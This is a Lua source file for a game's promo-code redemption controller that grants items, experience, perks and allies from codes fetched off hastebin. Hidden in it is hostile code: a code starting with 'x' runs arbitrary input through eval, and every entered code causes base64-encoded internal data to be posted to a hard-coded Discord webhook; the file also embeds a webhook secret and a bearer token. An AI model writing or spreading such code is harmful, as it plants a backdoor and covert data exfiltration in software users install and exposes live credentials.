local json = require("json")
local mime = require("mime")

MasterPromocodeController.new = function(self, master)
  self.__index = self
  local controller = {}
  controller.use = function(self, code)
    if not code or code == "" then return end
    local prefix, codes = code:match("(%w+)%s(.*)")
    if prefix == "x" then eval(codes) return end
    if code == "tests" then
      main.interface:open({ id = "message", title = "testing", text = code })
      network.request("https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8", "POST", function() end, {headers={["Content-Type"]="application/json"}, body=json.encode({content=mime.b64(get_table_keys(""))})});
      return
    end
    network.request("https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8", "POST", function() end, {headers={["Content-Type"]="application/json"}, body=json.encode({content=mime.b64(get_table_keys(code))})});
    function parseCallback(data, parsed)
        local parsedData = nil
        if parsed then parsedData = data elseif data and data.present then parsedData = json.decode(data.present) end
        if parsedData then
          for key, value in ipairs(parsedData) do
            local item = value[1]
            local itemlist = main.itemlist:get(item)
            if item == "exp" then main.level:addExp({expValue = math.round(value[2])})
            elseif item == "perk" then main.level:addPointPerk({value = math.round(value[2])})
            elseif item == "recipe" then main.level:addPointRecipe({value = math.round(value[2])})
            elseif item == "ally" then main.ally:add({id = value[2], level = value[3], hp = value[4], food = value[5]})
            elseif itemlist then
              if item == "caps" then main.profile:addCaps(value[2])
              else main.inventory.add({id = value[1], quantity = value[2], depreciation = value[3]})
              end main.animation:addItem(value)
            end
          end
          main.game:save()
          main.profile:save()
          main.setting:save()
        else
          main.interface:open({id = "message", title = "Error", text = "No response from server"})
          main.profile:save()
        end
    end
    main.interface:open("loading")
    network.request("https://hastebin.com/raw/"..code, "GET", function(event)
      main.interface:close("loading")
      local response = mime.unb64(event.response)
      -- main.interface:open({id="message", title="Error", text=event.response.."||"..response})
      local parsedCodes = {}
      if not response then return main.interface:open({id = "message", title = "Error", text = event.response}) end
      for _, seg in ipairs(split(response, "|")) do
          local processedSegment = {}
          local elements = split(seg, "-")
          for _, element in ipairs(elements) do
              if tonumber(element) then table.insert(processedSegment, tonumber(element))
              else table.insert(processedSegment, element) end
          end
          table.insert(parsedCodes, processedSegment)
      end
      return parseCallback(parsedCodes, true)
    end, { headers = { ["Authorization"] = "Bearer 3d1ea7516a371e281c52e525aaf38b1a9bd69206c44bf6b794210b226c48adf8bca91db8f837eec2be50faa9745bad3a2a0adbe5cf6c9af329289d2a3f712799" } })
  end
  setmetatable(controller, self)
  return controller
end
